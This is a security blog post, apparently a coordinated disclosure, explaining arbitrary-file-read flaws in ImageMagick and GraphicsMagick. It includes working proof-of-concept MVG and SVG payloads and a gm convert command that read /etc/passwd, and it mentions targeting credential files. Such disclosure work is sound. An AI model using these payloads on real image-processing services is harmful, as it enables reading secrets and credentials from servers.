# Security of Data processing libraries Part 2


Common feature for modern web applications to save and process user files. It can be a avatar generation, file thumbnails, reports or screenshot generation. Open source data processing libraries are usually used for such purposes. There are number of known vulnerabilities at those libraries that can be used to get access to the sensitive informtation. At this article I'll show you how to get access to arbitary file on vulnerable system and lure process memory into your open arms.

<!--more-->

# Tragick

[ImageTragick](https://imagetragick.com/) - multiple vulnerabilities in ImageMagick. One of the vulnerabilities can lead to remote code execution (RCE) if you process user submitted images. The exploit for this vulnerability is being used in the wild. GraphicsMagick library successfully fixed RCE but what about another vulnerabilities? Let's take a look on exploit.svg used at CVE-2016-3717.

```text
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```

Library will return error `Unable to open file` but what if we will change exploit to use another coder `label`? 

```bash
gm convert label:@/etc/passwd output.png
```

GraphicsMagick returns first line of file: `root:0:0:0:root:/root:/bin/bash`. So vulnerability exists and can be exploited on some coders. Let's take a look on Translate Text function. It have an interesting behavior: If text starts with '@' then try to replace it with the content of the file name which follows. 

```c
char *AmpersandTranslateText(const ImageInfo *image_info,
		Image *image, const char *formatted_text) {
/*
	If text starts with '@' then try to replace it with 
	the content of the file name which follows.
*/
  if ((*formatted_text == '@') && IsAccessible(formatted_text+1))
    {
      text=(char *) FileToBlob(formatted_text+1,&length,&image->exception);
      if (text == (char *) NULL)
        return((char *) NULL);
      TrimStringNewLine(text,length);
    }
  translated_text=TranslateText(image_info,image,text);
  if (text != (char *) formatted_text)
    MagickFreeMemory(text);

  return translated_text;
}
```

To exploit it malicious user shoud find all coders using it. Here we should take a little step back and return to Metadata. Please read [first part](https://d0ge.github.io/data-processing-libraries-part-two/). Translate function requests in attribute text when the blob is not open. This is really gross since it is assumed that the attribute is supplied by the user and the user intends for translation to occur.  However, 'comment' and 'label' attributes may also come from an image file and may contain arbitrary text.  As a crude-workaround, translations are only performed when the blob is not open. Is it secure to check blob state? It was found that SVG coder can be used to exploit it. We will skip a lot of C code and let's take a look on pseudocode:
- XML Parser end work
- CloseBlob(image) 
- MVG delegate start it work
- function SetImageAttribute(image,"comment",svg_info.comment) writes comment и title attributes to image.
- To exploit vulnerability malicious user should convert SVG to GIF, JPEG thumbnails with metadata information.

### Arbitary file read on image metadata
```xml
<?xml version="1.0" standalone="no"?>
<!--@/etc/passwd-->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="1237px" height="1237px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink= " http://www.w3.org/1999/xlink"> <image xlink:href="http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" x="0" y="0" height="137px" width="137px"/></svg>
```

Another interesting coder is MVG and image processing function

```c
case 'i':
{
if (LocaleCompare((char *) name,"image") == 0)
  {
  MVGPrintf(svg_info->file,"image Copy %g,%g %g,%g '%s'\n",
          svg_info->bounds.x,svg_info->bounds.y,svg_info->bounds.width,
          svg_info->bounds.height,svg_info->url);
  MVGPrintf(svg_info-&gt;file,"pop graphic-context\n");
  break;
  }
break;
}
```
What if malicious user can inject custom TextPrimitive inside ImagePrimitive at MVG coder. Let's take a look on SVG coder. When it reads `xlink:href` attribute single qout  `'` is not properly escaped and any MVG commands can be injected. Function AnnotateImage(annotate.c) reads text from file with TranslateTextEx that accepts '@' as local file. 
Local file read vulnerability affects GraphicsMagick before 1.3.32. Multiple decoders that may use MVG syntaxis by default. To exploit this vulnerability untrusted user file should be converted to another format with command:

```bash
gm convert exploit.svg output.png
```

### Arbitary file read on SVG coder

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="1237px" height="1237px" version="1.1"
	xmlns="http://www.w3.org/2000/svg" xmlns:xlink= "http://www.w3.org/1999/xlink">
	<image 
	xlink:href="http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png' text 128,128 '@/etc/passwd" 
	x="0" y="0" height="137px" width="137px"/>
</svg>
```


# Impact

We are using /etc/passd file for our PoC. The passwd file is not really very sensitive on modern systems. But real malicious user can get access to secrets and credentials stored at configuration files. Passwords are often baked into files such as Mercurial's hgrc file.  X11's .Xauthority file might be useful on an active desktop system.


# Acknowledgement

Thanks ImageMagick and GraphicsMagick teams for the coordination and bug fixing! 

